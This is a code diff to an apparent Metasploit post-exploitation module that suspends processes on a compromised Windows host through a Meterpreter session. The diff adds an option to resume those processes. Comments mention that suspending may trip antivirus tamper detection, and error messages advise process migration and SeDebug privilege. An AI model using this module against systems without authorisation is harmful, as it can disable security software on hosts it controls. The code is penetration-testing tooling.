@@ -58,7 +58,8 @@ class Metasploit3 < Msf::Post
 				OptString.new('PROCESSES', [false,
 					'Target process names, comma sep, to suspend (this or PIDS must be set)', nil]),
 				OptInt.new('DELAY', [true, 'The delay, in seconds, to wait before suspension', 0]),
-			#	OptBool.new('UNSUSPEND', [false, 'I am not sure this can be implemented',false]),
+				OptBool.new('UNSUSPEND', [false, 'Unsuspend the targets instead of suspend',
+					false]),
 				OptBool.new('USE_DLL', [true,
 					'Do NOT use Suspender.dll, this method might bother AVs',true]),
 				@@suspender32 = OptPath.new('SUSPENDER_DLL', [false,
@@ -88,10 +89,11 @@ class Metasploit3 < Msf::Post
 			print_status "Minimum delay for the DLL method is 1, changing delay to 1"
 			delay = 1
 		end
+		unsuspend = datastore['UNSUSPEND']
 		sysinfo = session.sys.config.sysinfo
 		#undo = datastore['UNSUSPEND']
 		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
-		if datastore['USE_DLL']
+		if (datastore['USE_DLL'] and not unsuspend)
 			# we need 32-bit suspender.dll to be there regardless of target OS arch as
 			# processes on a 64-bit OS may be either 32 or 64
 			suspenders = {}
@@ -174,7 +176,9 @@ class Metasploit3 < Msf::Post
 		end
 
 		# proceed based on which method was chosen
-		if datastore['USE_DLL']
+		if unsuspend
+			unsuspend_using_api(pids,delay)
+		elsif datastore['USE_DLL']
 			suspend_using_dll(pids_hash,delay,tempdir,suspenders)
 		else # use the meterpreter api
 			suspend_using_api(pids,delay)
@@ -267,6 +271,30 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+	def unsuspend_using_api(pids,delay=0)
+		# an AV could detect this as tampering
+		targetprocess = nil
+		begin
+			pids.each do |pid|
+				select(nil, nil, nil, delay)
+				print_status("Targeting process with PID #{pid}...")
+				targetprocess = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
+				vprint_status "Resuming threads"
+				targetprocess.thread.each_thread do |x|
+    				targetprocess.thread.open(x).resume
+				end
+			end
+		rescue ::Rex::Post::Meterpreter::RequestError => e
+			print_error "Error unsuspending(resuming) the process threads:  #{e.to_s}.  " +
+						"Try migrating to a process with the same owner as the target process"
+			check_halt "You may not have the correct permissions, try migrating to " +
+						"a proces with the same owner as the target process(es).  Also " +
+						"consider running the win_privs post module and confirm SeDebug priv."
+		ensure
+			targetprocess.close if targetprocess
+		end
+	end
+
 	def suspend_using_api(pids,delay)
 		# http://www.room362.com/blog/2011/5/30/remotely-suspend-all-threads-with-meterpreter.html
 		# "There are a few AVs engines that detected this as tampering. But if your target isn't AV..."
@@ -282,7 +310,8 @@ class Metasploit3 < Msf::Post
 				end
 			end
 		rescue ::Rex::Post::Meterpreter::RequestError => e
-			print_error "Error suspending the process threads:  #{e.to_s}"
+			print_error "Error suspending the process threads:  #{e.to_s}.  " + 
+						"Try migrating to a process with the same owner as the target process"
 			check_halt "You may not have the correct permissions, try migrating to " +
 						"a proces with the same owner as the target process(es).  Also " +
 						"consider running the win_privs post module and confirm SeDebug priv."
